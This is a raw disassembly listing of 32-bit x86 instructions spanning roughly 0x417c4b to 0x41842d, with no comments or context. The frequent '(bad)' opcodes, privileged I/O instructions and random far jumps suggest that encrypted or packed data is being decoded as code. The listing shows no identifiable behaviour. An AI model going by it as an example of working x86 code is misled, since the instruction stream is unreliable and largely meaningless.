  417c4b:	xchg   DWORD PTR [edx+0x44],ecx
  417c4e:	in     eax,dx
  417c4f:	cs fucom st(2)
  417c52:	out    0xe8,al
  417c54:	nop
  417c55:	mov    ?,WORD PTR [ecx]
  417c57:	(bad)  
  417c58:	loop   0x417c99
  417c5a:	cli    
  417c5b:	mov    dl,0x8a
  417c5d:	sbb    BYTE PTR [eax-0x12],dl
  417c60:	cmp    DWORD PTR [ebp+0x72b2a497],0x7a4ccc77
  417c6a:	ss push 0x8c099cd9
  417c70:	das    
  417c71:	add    BYTE PTR [edi],ch
  417c73:	sbb    eax,0x99992528
  417c78:	adc    al,0x97
  417c7a:	jge    0x417c7b
  417c7c:	cwde   
  417c7d:	popw   es
  417c7f:	mov    DWORD PTR [edi+0x2e5a1f41],ebx
  417c85:	push   edx
  417c86:	sbb    esi,DWORD PTR [esi+0x15]
  417c89:	add    al,0xc3
  417c8b:	rcr    ch,0x5d
  417c8e:	xor    ah,BYTE PTR [esi-0x51cb525c]
  417c94:	fadd   QWORD PTR [eax-0x2b]
  417c97:	cld    
  417c98:	sub    eax,0x5f18b755
  417c9d:	push   0x6d78b097
  417ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ca3:	in     eax,dx
  417ca4:	or     al,0x1
  417ca6:	out    dx,al
  417ca7:	or     al,0x1c
  417ca9:	sub    ebx,DWORD PTR [edi+eax*4+0x64]
  417cad:	retf   
  417cae:	xor    DWORD PTR [edx+0x75],eax
  417cb1:	mov    ds:0xf152937,al
  417cb6:	les    eax,FWORD PTR [edi]
  417cb8:	gs xor al,0x98
  417cbb:	lods   eax,DWORD PTR ds:[esi]
  417cbc:	aam    0xce
  417cbe:	(bad)  
  417cc0:	jne    0x417d02
  417cc2:	int    0x7f
  417cc4:	lea    ebp,[esi]
  417cc6:	in     eax,0xe6
  417cc8:	xchg   ecx,eax
  417cc9:	and    DWORD PTR [eax+0x1522b72],ebx
  417ccf:	jo     0x417d21
  417cd1:	jo     0x417d16
  417cd3:	xor    eax,0xf7b741c3
  417cd8:	mov    ch,BYTE PTR [edi]
  417cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cdb:	ret    
  417cdc:	imul   BYTE PTR [ebx]
  417cde:	xchg   esp,eax
  417cdf:	push   eax
  417ce0:	fisub  WORD PTR [esi-0x72]
  417ce3:	pop    es
  417ce4:	(bad)  
  417ce5:	not    BYTE PTR [esp+esi*2-0x2c]
  417ce9:	inc    eax
  417cea:	outs   dx,DWORD PTR ds:[esi]
  417ceb:	fld1   
  417ced:	and    al,0x9e
  417cef:	mov    eax,eax
  417cf1:	xor    al,0x8e
  417cf3:	dec    esp
  417cf4:	jmp    0x417d12
  417cf6:	xor    BYTE PTR [eax-0x50bfcf],ch
  417cfc:	fadd   DWORD PTR [eax+ebx*8]
  417cff:	add    al,0xec
  417d01:	in     eax,dx
  417d02:	ror    DWORD PTR [ebp-0xd16efa3],1
  417d08:	adc    eax,0x4e11104d
  417d0d:	inc    esi
  417d0e:	sahf   
  417d0f:	stc    
  417d10:	test   BYTE PTR [ecx],0x2
  417d13:	sbb    ch,BYTE PTR ds:0x3936a5e6
  417d19:	inc    eax
  417d1a:	adc    DWORD PTR [ebx+0x5b7c21d3],0xde976c3b
  417d24:	sub    al,0xb8
  417d26:	loop   0x417d9c
  417d28:	add    al,0x66
  417d2a:	and    al,BYTE PTR [edx-0x78c4b48e]
  417d30:	out    0x5,al
  417d32:	imul   BYTE PTR [eax]
  417d34:	fld    QWORD PTR [ecx-0x899eb75]
  417d3a:	repnz xchg esi,eax
  417d3c:	sahf   
  417d3d:	inc    edi
  417d3e:	mov    ah,0x56
  417d40:	push   ebx
  417d41:	sbb    eax,0x4d9df196
  417d46:	mov    esi,0x17573536
  417d4b:	add    al,0x1d
  417d4d:	in     al,dx
  417d4e:	stos   DWORD PTR es:[edi],eax
  417d4f:	xchg   BYTE PTR [esi],bl
  417d51:	pop    esi
  417d52:	int3   
  417d53:	jnp    0x417d2f
  417d55:	pop    ebx
  417d56:	xchg   DWORD PTR [edi-0x45b5ee09],eax
  417d5c:	fisttp WORD PTR [edx]
  417d5e:	push   esp
  417d5f:	pop    esp
  417d60:	add    DWORD PTR [eax-0x14a25976],esp
  417d66:	pop    esp
  417d67:	(bad)  
  417d68:	push   edi
  417d69:	ret    
  417d6a:	xor    al,BYTE PTR [edi+0x5ae7b8ce]
  417d70:	fnstsw WORD PTR [eax-0x4bb3a370]
  417d76:	in     eax,0x35
  417d78:	sbb    eax,0x35afb74f
  417d7d:	js     0x417d36
  417d7f:	push   esp
  417d80:	aaa    
  417d81:	dec    BYTE PTR [edi+0x6b]
  417d84:	fnsave [ebp+0xf]
  417d87:	and    DWORD PTR [ecx-0x6d1771ab],eax
  417d8d:	dec    edi
  417d8e:	or     ch,ah
  417d90:	jb     0x417d25
  417d92:	pop    ss
  417d93:	ins    BYTE PTR es:[edi],dx
  417d94:	dec    esp
  417d95:	mov    al,ds:0xe7bf7f80
  417d9a:	call   0x7fa6:0x3defeeea
  417da1:	loopne 0x417dd3
  417da3:	dec    esi
  417da4:	icebp  
  417da5:	mov    eax,0x50d0dc9f
  417daa:	jl     0x417d33
  417dac:	sar    bh,cl
  417dae:	sub    DWORD PTR [esi],esi
  417db0:	shr    DWORD PTR [edi+ebx*4],1
  417db3:	dec    edx
  417db4:	aad    0xd9
  417db6:	ret    
  417db7:	jno    0x417dc6
  417db9:	and    BYTE PTR [edx-0x17],0xae
  417dbd:	inc    eax
  417dbe:	aam    0xdd
  417dc0:	sbb    al,0xc2
  417dc2:	ins    DWORD PTR es:[edi],dx
  417dc3:	xchg   ecx,eax
  417dc4:	jmp    0xcab5:0xbda997e2
  417dcb:	sbb    DWORD PTR [edi+0x34d68982],ebx
  417dd1:	pop    esi
  417dd2:	pop    es
  417dd3:	xchg   DWORD PTR [ebx],edi
  417dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dd6:	retf   
  417dd7:	imul   ecx,edi,0x52
  417dda:	cdq    
  417ddb:	sbb    eax,0xc01a2691
  417de0:	add    al,BYTE PTR [eax+0x5fbc2bdc]
  417de6:	mov    ah,0x10
  417de8:	push   ebx
  417de9:	add    BYTE PTR [ebx],cl
  417deb:	loop   0x417d9a
  417ded:	push   edi
  417dee:	xlat   BYTE PTR ds:[ebx]
  417def:	(bad)  
  417df0:	fstp   QWORD PTR [ecx]
  417df2:	rcl    esi,cl
  417df4:	xchg   esp,eax
  417df5:	or     BYTE PTR [eax],al
  417df7:	inc    ebx
  417df8:	and    al,BYTE PTR [ecx-0x27]
  417dfb:	push   0x27
  417dfd:	pop    ebp
  417dfe:	pop    ebx
  417dff:	retf   
  417e00:	sbb    DWORD PTR ds:0xad78b9ee,esp
  417e06:	xchg   edi,eax
  417e07:	out    0x95,al
  417e09:	popa   
  417e0a:	jae    0x417e58
  417e0c:	hlt    
  417e0d:	shl    BYTE PTR [ecx+0x25],0xeb
  417e11:	test   eax,0xdedd9081
  417e16:	leave  
  417e17:	cdq    
  417e18:	neg    eax
  417e1a:	iret   
  417e1b:	or     ebx,eax
  417e1d:	inc    eax
  417e1e:	fstp   TBYTE PTR [edx+0x23]
  417e21:	clc    
  417e22:	pop    esi
  417e23:	(bad)  
  417e24:	and    al,0x40
  417e26:	(bad)  
  417e27:	cmc    
  417e28:	push   ebx
  417e29:	mov    ecx,0x89b07831
  417e2e:	scas   al,BYTE PTR es:[edi]
  417e2f:	pusha  
  417e30:	aad    0xec
  417e32:	xchg   edi,eax
  417e33:	aaa    
  417e34:	cli    
  417e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e36:	sbb    ebx,DWORD PTR [esi]
  417e38:	xor    eax,0xe1cf6eb0
  417e3d:	mov    al,0x5e
  417e3f:	mov    ds:0x87436711,eax
  417e44:	shl    DWORD PTR [edi-0x69],cl
  417e47:	sar    BYTE PTR ds:0xede9fc85,1
  417e4d:	mov    ch,0xcc
  417e4f:	pop    eax
  417e50:	mov    cl,0x40
  417e52:	jmp    0x417ec4
  417e54:	test   ah,bh
  417e56:	sub    al,BYTE PTR [edx-0x5e0c6afd]
  417e5c:	les    eax,FWORD PTR [eax-0x45]
  417e5f:	adc    eax,0xa2aec434
  417e64:	into   
  417e65:	inc    eax
  417e66:	das    
  417e67:	call   0x1f98:0x71fcc6e5
  417e6e:	mov    dh,0x38
  417e70:	inc    ebp
  417e71:	inc    ecx
  417e72:	xchg   edi,eax
  417e73:	xor    al,0x4c
  417e75:	jbe    0x417e90
  417e77:	dec    ebx
  417e78:	aad    0xd8
  417e7a:	pop    eax
  417e7b:	jno    0x417e86
  417e7d:	xor    ecx,ecx
  417e7f:	lea    ecx,[ecx+0x74557ae0]
  417e85:	push   edi
  417e86:	xchg   edi,eax
  417e87:	and    ebx,DWORD PTR [edi]
  417e89:	loope  0x417ecc
  417e8b:	outs   dx,DWORD PTR ds:[esi]
  417e8c:	dec    ecx
  417e8d:	mov    ds:0xfb50f3fb,al
  417e92:	pop    esi
  417e93:	xchg   eax,edi
  417e95:	dec    edx
  417e96:	add    eax,0xeb35ec51
  417e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e9c:	and    BYTE PTR [eax+0x74d2e01b],al
  417ea2:	mov    ecx,0x514017b3
  417ea7:	pop    ds
  417ea8:	test   eax,0x5980114f
  417ead:	jle    0x417e46
  417eaf:	jne    0x417edf
  417eb1:	lahf   
  417eb2:	leave  
  417eb3:	sub    al,0xf9
  417eb5:	ja     0x417f09
  417eb7:	push   ds
  417eb8:	and    al,0x90
  417eba:	pop    es
  417ebb:	mov    cl,cl
  417ebd:	and    ah,0xd9
  417ec0:	sahf   
  417ec1:	sahf   
  417ec2:	xchg   edi,eax
  417ec3:	pop    edx
  417ec4:	jmp    0xa89b:0x5d133b0a
  417ecb:	mov    esi,0x872c6bf2
  417ed0:	push   esi
  417ed1:	mov    esi,DWORD PTR [edx-0x6edc19ba]
  417ed7:	pop    ebp
  417ed8:	mov    ch,0xc0
  417eda:	and    esi,DWORD PTR [ecx]
  417edc:	cmp    bl,BYTE PTR [edi-0x37]
  417edf:	and    DWORD PTR [edi+0x7b],edi
  417ee2:	lahf   
  417ee3:	xchg   dh,ch
  417ee5:	mov    esp,0xc7ddd384
  417eea:	push   ecx
  417eeb:	mov    esi,0x8d099acd
  417ef0:	xlat   BYTE PTR ds:[ebx]
  417ef1:	inc    eax
  417ef2:	lods   al,BYTE PTR ds:[esi]
  417ef3:	xchg   edx,eax
  417ef4:	mov    BYTE PTR [ecx],dl
  417ef6:	push   es
  417ef7:	mov    al,ds:0x6e98103f
  417efc:	cwde   
  417efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417efe:	mov    WORD PTR [esi+0x794e33e0],fs
  417f04:	fisub  WORD PTR [esi]
  417f06:	add    BYTE PTR [edi-0x48a9677d],0x19
  417f0d:	push   es
  417f0e:	retf   
  417f0f:	mov    ds:0x74e875d,al
  417f14:	jb     0x417f52
  417f16:	push   ss
  417f17:	mov    ecx,edx
  417f19:	lods   al,BYTE PTR ds:[esi]
  417f1a:	and    eax,DWORD PTR [edi+0x3b42aa7c]
  417f20:	fstp   QWORD PTR [edi+eiz*1+0x71]
  417f24:	data16 sub al,0x78
  417f27:	xchg   esi,eax
  417f28:	test   eax,0x459b2240
  417f2d:	sbb    dl,BYTE PTR [ebp+edi*4+0x5f]
  417f31:	mov    dl,0xa5
  417f33:	sub    esi,DWORD PTR [esi]
  417f35:	ins    BYTE PTR es:[edi],dx
  417f36:	cmp    eax,DWORD PTR [esi+0x2c]
  417f39:	fldcw  WORD PTR [ecx-0x59]
  417f3c:	ret    
  417f3d:	inc    eax
  417f3e:	xor    ecx,ecx
  417f40:	push   eax
  417f41:	jle    0x417f4a
  417f43:	sub    bh,BYTE PTR [ebp+ebx*1-0x68]
  417f47:	dec    ecx
  417f48:	jg     0x417f8c
  417f4a:	cmp    esp,DWORD PTR [ebp+0x39]
  417f4d:	and    ebx,DWORD PTR [edx]
  417f4f:	shl    edx,0x4e
  417f52:	and    DWORD PTR fs:[edi-0x23],0x3d73bf57
  417f5a:	int    0xa7
  417f5c:	repz sbb BYTE PTR [edi+0x3e],dl
  417f60:	fidivr WORD PTR [ecx-0x41]
  417f63:	sbb    eax,0xc284f501
  417f68:	adc    ebp,edi
  417f6a:	adc    edi,DWORD PTR ds:0x87595ba2
  417f70:	jmp    0xfa94:0xde9a5f33
  417f77:	cmp    eax,0x9c8f63e9
  417f7c:	std    
  417f7d:	lea    eax,[ecx]
  417f7f:	cli    
  417f80:	pop    edi
  417f81:	xor    DWORD PTR [edx-0x7db24f7a],ebp
  417f87:	in     al,dx
  417f88:	frstor [edi-0x17]
  417f8b:	call   0xea4115a
  417f90:	xlat   BYTE PTR ds:[ebx]
  417f91:	inc    eax
  417f92:	ss push ebp
  417f94:	std    
  417f95:	sub    DWORD PTR [edi],0xa66749bd
  417f9b:	add    BYTE PTR [ebx+0x54],bl
  417f9e:	add    BYTE PTR [eax],0xf0
  417fa1:	ret    
  417fa2:	outs   dx,DWORD PTR ds:[esi]
  417fa3:	(bad)  
  417fa4:	and    al,0x43
  417fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fa7:	(bad)  [edi]
  417fa9:	adc    bh,BYTE PTR [esi+0x66]
  417fac:	lods   eax,DWORD PTR ds:[esi]
  417fad:	xlat   BYTE PTR ds:[ebx]
  417fae:	sub    eax,0xea90e4fc
  417fb3:	mov    ds:0x5ac81ba3,al
  417fb8:	jno    0x417fbc
  417fba:	imul   ebx,DWORD PTR [eax+0x6f784044],0xffffffed
  417fc1:	dec    esi
  417fc2:	aas    
  417fc3:	aad    0x65
  417fc5:	and    eax,0x2a523e98
  417fca:	sub    DWORD PTR [ebx+0x68c5b036],edi
  417fd0:	adc    al,0x79
  417fd2:	jmp    0x52309b5d
  417fd7:	and    ch,bl
  417fd9:	leave  
  417fda:	pushf  
  417fdb:	jl     0x418012
  417fdd:	loope  0x41801e
  417fdf:	or     bh,BYTE PTR [eax]
  417fe1:	inc    eax
  417fe2:	cmp    edi,DWORD PTR ds:0xdb22bcd5
  417fe8:	or     eax,0x5c609839
  417fed:	mov    bl,0x45
  417fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ff0:	fcmovbe st,st(7)
  417ff2:	test   DWORD PTR fs:[esi+0x77],ebx
  417ff6:	or     esp,DWORD PTR [ebx+0x24183bf8]
  417ffc:	dec    edi
  417ffd:	jp     0x417ffc
  417fff:	inc    ebp
  418000:	push   edx
  418001:	xor    DWORD PTR [ebp-0x27d0e5e8],0xe3a82101
  41800b:	mov    ch,0xfd
  41800d:	inc    eax
  41800e:	mov    edi,0x39463be5
  418013:	mov    edx,0x595930a6
  418018:	in     al,0x5
  41801a:	mov    ds:0x79abc19,al
  41801f:	xchg   ebx,eax
  418020:	dec    ebp
  418021:	fild   DWORD PTR [esi-0x314876dd]
  418027:	xchg   ecx,eax
  418028:	fiadd  WORD PTR [eax+0xbf589b]
  41802e:	cmp    al,0x27
  418030:	fld    QWORD PTR [edx]
  418032:	sti    
  418033:	stos   BYTE PTR es:[edi],al
  418034:	adc    eax,0xcdb0899
  418039:	inc    eax
  41803a:	or     esp,edx
  41803c:	or     eax,DWORD PTR ds:0x6db28df5
  418042:	int3   
  418043:	test   eax,0xef986c70
  418048:	daa    
  418049:	jns    0x41800e
  41804b:	mov    ebx,DWORD PTR [esi-0x16]
  41804e:	add    al,0x68
  418050:	retf   
  418051:	(bad)  
  418052:	call   0x4874f90c
  418057:	mov    bh,0xd9
  418059:	ficom  WORD PTR [edi+0x3be2c879]
  41805f:	mov    WORD PTR [ecx+0x6bf09b26],?
  418065:	loopne 0x418046
  418067:	mov    DWORD PTR [eax],ebp
  418069:	cmp    eax,0x23cdca60
  41806e:	mov    ah,0x42
  418070:	mov    ecx,edi
  418072:	pop    ss
  418073:	and    dl,BYTE PTR [eax+0x5]
  418076:	xor    DWORD PTR [eax],ecx
  418078:	jle    0x4180ba
  41807a:	dec    eax
  41807b:	add    eax,0xa21761c1
  418080:	jmp    0xe8c617cb
  418085:	xor    eax,0x79acbba6
  41808a:	cld    
  41808b:	mov    cs,ebx
  41808d:	dec    edi
  41808e:	ins    DWORD PTR es:[edi],dx
  41808f:	mov    BYTE PTR [eax+0x2d],dl
  418092:	test   eax,0x97744035
  418097:	data16 aas 
  418099:	sbb    DWORD PTR ds:0xee1fd078,0xfffffff1
  4180a0:	aaa    
  4180a1:	fbld   TBYTE PTR [edx+eiz*4-0x78ad01b7]
  4180a8:	sub    dl,BYTE PTR [ebx-0x70ec7168]
  4180ae:	or     ecx,DWORD PTR [edi+0x28]
  4180b1:	ins    BYTE PTR es:[edi],dx
  4180b2:	addr16 push ebx
  4180b4:	bound  eax,QWORD PTR [eax-0x36]
  4180b7:	addr16 pop es
  4180b9:	xchg   ecx,eax
  4180ba:	mov    cl,0xdd
  4180bc:	xchg   DWORD PTR [eax+eiz*4-0x21],esi
  4180c0:	icebp  
  4180c1:	xchg   edi,eax
  4180c2:	push   0xffffffe5
  4180c4:	es sbb bl,0x6
  4180c8:	dec    edi
  4180c9:	inc    eax
  4180ca:	push   eax
  4180cb:	(bad)  
  4180cc:	dec    BYTE PTR [ebx-0x56]
  4180cf:	or     eax,0xac975cb3
  4180d4:	fcom   DWORD PTR [edi+0x43ebd98]
  4180da:	sbb    eax,0xdc29e638
  4180df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180e0:	test   DWORD PTR [esi-0x34],eax
  4180e3:	push   es
  4180e4:	pop    es
  4180e5:	dec    esp
  4180e6:	xchg   ebp,eax
  4180e7:	xchg   ecx,eax
  4180e8:	frstor [edx]
  4180ea:	call   0x32eb8a6f
  4180ef:	gs stc 
  4180f1:	aas    
  4180f2:	adc    esi,esp
  4180f4:	mov    esp,0xad28312a
  4180f9:	daa    
  4180fa:	cwde   
  4180fb:	(bad)  
  4180fc:	loop   0x4180ac
  4180fe:	scas   al,BYTE PTR es:[edi]
  4180ff:	jbe    0x4180cf
  418101:	(bad)  
  418102:	shl    BYTE PTR [esi+0x48],cl
  418105:	and    ebx,DWORD PTR [eax-0x113cec3c]
  41810b:	sub    bh,BYTE PTR [eax-0x3ca6818]
  418111:	and    esi,DWORD PTR [esi-0x6f]
  418114:	cmp    DWORD PTR [esi+0x70f69b1f],ecx
  41811a:	pushf  
  41811b:	xchg   BYTE PTR [eax],al
  41811d:	sbb    DWORD PTR [edx-0x30],esp
  418120:	(bad)  
  418122:	icebp  
  418123:	jno    0x4180e3
  418125:	mov    eax,ds:0x4058ff59
  41812a:	shr    DWORD PTR [edx-0xfa53b8f],1
  418130:	test   DWORD PTR [edx],ebp
  418132:	cwde   
  418133:	(bad)  [ebx+0x16072e60]
  418139:	inc    edx
  41813a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41813b:	xlat   BYTE PTR ds:[ebx]
  41813c:	sub    eax,0x35c5174f
  418141:	retf   0xb9fd
  418144:	inc    ecx
  418145:	pop    ebx
  418146:	xchg   edi,eax
  418147:	out    0xf,al
  418149:	mov    eax,ds:0x2b169008
  41814e:	loope  0x418145
  418150:	jb     0x4180f5
  418152:	pushf  
  418153:	shl    BYTE PTR [esi+0x5f],cl
  418156:	push   ds
  418157:	fimul  WORD PTR [ebp-0x21f8cc35]
  41815d:	imul   ecx,esi,0xffffffc1
  418160:	dec    eax
  418161:	(bad)  
  418162:	int3   
  418163:	push   es
  418164:	sbb    eax,0x5388dee0
  418169:	dec    esi
  41816a:	jmp    0x4181d1
  41816c:	push   es
  41816d:	push   0x3b546f57
  418172:	lahf   
  418173:	out    dx,eax
  418174:	fstp   QWORD PTR [ebp+0x50eb0d66]
  41817a:	sbb    al,0xb7
  41817c:	lods   eax,DWORD PTR ds:[esi]
  41817d:	dec    esi
  41817e:	mul    DWORD PTR [eax]
  418180:	adc    eax,0x89ab759
  418185:	jno    0x4181cf
  418187:	call   0x37a5:0xe2ebb3de
  41818e:	xchg   edx,eax
  41818f:	enter  0x7dc5,0x3d
  418193:	ret    
  418194:	push   esi
  418195:	imul   edi,ebp,0x7e5d2586
  41819b:	and    bl,ch
  41819d:	(bad)  
  41819e:	sti    
  41819f:	pushf  
  4181a0:	mov    ah,0x94
  4181a2:	icebp  
  4181a3:	mov    ebp,0x6250402e
  4181a8:	and    DWORD PTR [edx-0x65],esi
  4181ab:	sahf   
  4181ac:	inc    edx
  4181ad:	retf   
  4181ae:	call   0x6941:0xce2c4d81
  4181b5:	sbb    BYTE PTR [esi+0x49],al
  4181b8:	int3   
  4181b9:	inc    eax
  4181ba:	mov    eax,ds:0xe136bd13
  4181bf:	push   eax
  4181c0:	cmp    eax,0x5921c36a
  4181c5:	xchg   esi,eax
  4181c6:	xchg   edi,eax
  4181c7:	in     al,0x8d
  4181c9:	loope  0x418154
  4181cb:	push   edx
  4181cc:	cmp    al,0x40
  4181ce:	xor    DWORD PTR ds:0x6612c987,ebx
  4181d4:	leave  
  4181d5:	mov    cl,0x97
  4181d7:	mov    eax,ds:0xba637133
  4181dc:	mov    ecx,0xdc8ec410
  4181e1:	cmovs  eax,eax
  4181e4:	add    eax,0xebcc550b
  4181e9:	fsub   QWORD PTR [ebp-0x1f]
  4181ec:	pop    ecx
  4181ed:	mov    al,ds:0x3b5c41ae
  4181f2:	inc    esp
  4181f3:	pop    ecx
  4181f4:	cld    
  4181f5:	jbe    0x418182
  4181f7:	xchg   DWORD PTR [ebp+0x1],esi
  4181fa:	or     BYTE PTR [ecx],bl
  4181fc:	in     al,0x1c
  4181fe:	jns    0x418208
  418200:	adc    BYTE PTR [ebp-0x69],ah
  418203:	cmp    BYTE PTR [edx],0xc6
  418206:	xor    BYTE PTR [eax+ebx*8+0x7e],dl
  41820a:	sub    eax,0x87d4df67
  41820f:	xchg   edi,eax
  418210:	pop    ebx
  418211:	arpl   WORD PTR [edi-0x5f],dx
  418214:	aaa    
  418215:	js     0x4181ae
  418217:	inc    esp
  418218:	inc    ebx
  418219:	inc    ebx
  41821a:	lea    ecx,[ebx]
  41821c:	ins    DWORD PTR es:[edi],dx
  41821d:	retf   
  41821e:	ja     0x4181c5
  418220:	call   0xa2bcc464
  418225:	pop    edx
  418226:	fnstsw WORD PTR [ebx]
  418228:	mov    ds:0xd5c797cd,eax
  41822d:	mov    ebp,0xa4fe9917
  418232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418233:	nop
  418234:	jmp    0x5bc90989
  418239:	mov    ?,WORD PTR [ecx-0x7b]
  41823c:	in     al,0xb1
  41823e:	mov    bl,cl
  418240:	dec    esi
  418241:	xor    BYTE PTR [edi],0xdc
  418244:	bound  edx,QWORD PTR [eax]
  418246:	adc    ecx,DWORD PTR [edx+ebp*1+0x46]
  41824a:	cmp    BYTE PTR [edi+0x13767be],al
  418250:	(bad)  
  418252:	mov    ch,0xda
  418254:	pop    edx
  418255:	cmc    
  418256:	or     eax,ebx
  418258:	mov    ebp,0x810d3440
  41825d:	jb     0x41820e
  41825f:	in     al,dx
  418260:	sub    BYTE PTR [edi+eiz*1-0x779f148e],ah
  418267:	inc    edi
  418268:	or     eax,0xe752ea0
  41826d:	xor    ecx,DWORD PTR [ecx+0x32]
  418270:	cmp    al,0x6a
  418272:	jge    0x4181fb
  418274:	dec    eax
  418275:	mov    edi,0xa2cd597a
  41827a:	xchg   edi,eax
  41827b:	inc    ebx
  41827c:	inc    ebx
  41827d:	mov    dh,0x4
  41827f:	sbb    DWORD PTR [edi],0x75cf74ec
  418285:	retf   0x888b
  418288:	imul   eax,DWORD PTR [edi-0x1c],0x6014f2a5
  41828f:	cmp    BYTE PTR [edi+eiz*1-0x68],0x72
  418294:	sub    eax,0x255f1830
  418299:	sub    DWORD PTR [ecx-0x71b11741],esi
  41829f:	xchg   edi,esp
  4182a1:	cmp    bl,al
  4182a3:	sti    
  4182a4:	xlat   BYTE PTR ds:[ebx]
  4182a5:	jb     0x418230
  4182a7:	(bad)  
  4182a8:	loopne 0x4182b0
  4182aa:	jg     0x4182e7
  4182ac:	dec    eax
  4182ad:	jmp    0xb0de9798
  4182b2:	add    al,0x2c
  4182b4:	add    DWORD PTR [eax+0x45],0xfe755101
  4182bb:	mov    ds:0x2695c95d,al
  4182c0:	fst    QWORD PTR [esi-0x44]
  4182c3:	arpl   WORD PTR [ecx+0x60],bp
  4182c6:	mov    eax,0x2945cf7d
  4182cb:	jno    0x41827c
  4182cd:	add    eax,0xdb25ff9d
  4182d2:	mov    ah,0x6
  4182d4:	frstor [eax]
  4182d6:	aaa    
  4182d7:	or     BYTE PTR [edi-0x3c96c42d],ah
  4182dd:	inc    eax
  4182de:	stc    
  4182df:	loop   0x4182fa
  4182e1:	inc    edx
  4182e2:	add    al,0x4
  4182e4:	cmp    eax,0x445fb701
  4182e9:	neg    DWORD PTR [esi]
  4182eb:	out    0xe,al
  4182ed:	fcom   QWORD PTR [edi+0x5b]
  4182f0:	aam    0xb2
  4182f2:	dec    ebp
  4182f3:	dec    esi
  4182f4:	bound  ebx,QWORD PTR [esi]
  4182f6:	jle    0x41827f
  4182f8:	fadd   QWORD PTR [ebp+0x35]
  4182fb:	enter  0xe775,0x97
  4182ff:	jbe    0x418339
  418301:	cmc    
  418302:	inc    edi
  418303:	mov    eax,0x7b1b54ce
  418308:	jbe    0x418343
  41830a:	sbb    al,BYTE PTR [edi+0x37eab902]
  418310:	iret   
  418311:	aad    0x97
  418313:	push   edx
  418314:	in     al,dx
  418315:	dec    edi
  418316:	mov    ds:0xcb25de3c,eax
  41831b:	(bad)  
  41831c:	dec    ecx
  41831d:	lock mov ss:0xc71d9319,al
  418324:	sub    esi,DWORD PTR [edi+edx*8]
  418327:	enter  0xc074,0xf6
  41832b:	int    0xab
  41832d:	test   eax,0x403ba57f
  418332:	push   cs
  418333:	aaa    
  418334:	fcmovnu st,st(7)
  418336:	sub    eax,0xd14a5518
  41833b:	cmp    DWORD PTR [esi+0x3069f340],ebx
  418341:	bndldx (bad),ds:0x8ce6404b
  418348:	mov    ds:0x9ccd06f4,eax
  41834d:	pop    eax
  41834e:	xchg   edi,eax
  41834f:	and    al,bh
  418351:	jecxz  0x418327
  418353:	mov    cl,0x16
  418355:	pop    ebp
  418356:	fs aaa 
  418358:	pop    eax
  418359:	dec    esp
  41835a:	test   BYTE PTR [edi-0x15dd15d8],0xee
  418361:	daa    
  418362:	cwde   
  418363:	out    0xa2,al
  418365:	sbb    al,bl
  418367:	fisub  DWORD PTR [eax+0x45]
  41836a:	dec    ebx
  41836b:	fcmovb st,st(1)
  41836d:	adc    DWORD PTR ss:[eax-0x4f],ebp
  418371:	(bad)  [esi-0x79]
  418374:	jbe    0x418335
  418376:	loop   0x41830a
  418378:	frstor [ebx-0x60]
  41837b:	push   edi
  41837c:	ins    DWORD PTR es:[edi],dx
  41837d:	add    BYTE PTR [esi+ebx*8+0x66a45643],ch
  418384:	dec    esi
  418385:	inc    eax
  418386:	xchg   ebx,eax
  418387:	or     al,0x13
  418389:	pop    ds
  41838a:	sbb    DWORD PTR [ecx-0x23],edx
  41838d:	cmp    BYTE PTR [edi+0x3d047c0e],0x32
  418394:	pop    ss
  418395:	inc    eax
  418396:	dec    edi
  418397:	sbb    eax,0x104ddac
  41839c:	push   eax
  41839d:	mov    al,0x97
  41839f:	fbstp  TBYTE PTR [ebp+0x21]
  4183a2:	rol    DWORD PTR [ebx],1
  4183a4:	xchg   esp,eax
  4183a5:	(bad)  [ebx]
  4183a7:	call   0xc5f60b62
  4183ac:	sub    eax,DWORD PTR [eax-0xc]
  4183af:	mov    ah,0x79
  4183b1:	(bad)  
  4183b2:	(bad)  
  4183b3:	retf   0xe852
  4183b6:	mov    ebx,0x98f54fc7
  4183bb:	lods   al,BYTE PTR ds:[esi]
  4183bc:	in     eax,0xf0
  4183be:	inc    edx
  4183bf:	mov    dh,BYTE PTR [ecx+0x4754f2b]
  4183c5:	stos   BYTE PTR es:[edi],al
  4183c6:	stos   BYTE PTR es:[edi],al
  4183c7:	xchg   BYTE PTR [ebx],cl
  4183c9:	mov    eax,ds:0x33dda728
  4183ce:	call   0x2c9a13e6
  4183d3:	pop    ebx
  4183d4:	or     BYTE PTR [eax+0x2a],al
  4183d7:	sti    
  4183d8:	int    0x11
  4183da:	ins    DWORD PTR es:[edi],dx
  4183db:	jmp    0x7df2:0x989ace7a
  4183e2:	mov    BYTE PTR [ecx+0x6fc7c062],dl
  4183e8:	pop    esp
  4183e9:	dec    edi
  4183ea:	popf   
  4183eb:	out    0xfc,al
  4183ed:	pop    ebp
  4183ee:	not    DWORD PTR [edx+0x29]
  4183f1:	stos   DWORD PTR es:[edi],eax
  4183f2:	ret    0x50c9
  4183f5:	cld    
  4183f6:	xchg   edi,eax
  4183f7:	popa   
  4183f8:	mov    cl,0xe9
  4183fa:	adc    al,0x55
  4183fc:	dec    ecx
  4183fd:	lahf   
  4183fe:	pop    esp
  4183ff:	sti    
  418400:	or     BYTE PTR [ecx-0x14],0x86
  418404:	ja     0x41846a
  418406:	pop    es
  418407:	mov    al,ds:0xe39da9e8
  41840c:	dec    edx
  41840d:	rol    BYTE PTR [edx],0x38
  418410:	lods   al,BYTE PTR ds:[esi]
  418411:	imul   ecx,DWORD PTR [edx-0x29d77d6a],0xe6d0738d
  41841b:	sahf   
  41841c:	cmp    DWORD PTR [ebx+0x38b84d97],ebp
  418422:	into   
  418423:	xchg   esi,eax
  418424:	mov    ah,0xbc
  418426:	mov    esi,0xb2335d49
  41842b:	xchg   BYTE PTR [esi],bl
  41842d:	cmp    eax,0xb4d96bcc
